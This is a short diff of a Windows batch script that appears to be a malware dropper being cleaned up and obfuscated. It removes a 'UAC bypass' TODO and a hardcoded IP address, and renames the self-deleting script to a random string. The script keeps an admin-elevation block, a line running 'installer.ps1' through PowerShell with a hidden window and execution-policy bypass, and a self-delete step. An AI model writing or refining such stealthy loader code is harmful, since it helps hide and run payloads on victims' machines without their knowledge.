@@ -1,9 +1,5 @@
-@REM TODO: add UAC bypass dumbass
-
-@REM change me
-@REM set "EcSjRhAguo=45.61.56.252"
-
 @echo off
+
 :: BatchGotAdmin
 :-------------------------------------
 if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
@@ -42,4 +38,4 @@ powershell powershell.exe -windowstyle hidden -ep bypass "./installer.ps1"
 
 
 @REM self delete
-del wget.cmd
+del IVbaANzwiphH.cmd
